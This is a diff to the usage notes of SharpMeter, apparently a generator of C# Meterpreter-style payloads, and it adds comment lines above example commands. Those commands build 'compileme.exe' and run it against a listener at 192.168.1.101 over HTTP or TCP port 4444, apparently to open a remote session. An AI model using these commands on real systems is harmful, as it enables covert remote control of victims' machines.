@@ -15,9 +15,12 @@ python SharpMeter.py 192.168.1.101 80 compileme.cs http -w -x -m
 
 # Example Overide URL:
 python SharpMeter.py 0.0.0.0 0 compileme.cs http -i
+# To Run
 compileme.exe http://192.168.1.101:80/
 
+# Example Overide URL:
 python SharpMeter.py 0.0.0.0 0 compileme.cs tcp -i
+# To Run
 compileme.exe 192.168.1.101:4444
 
 # Example embed shellcode
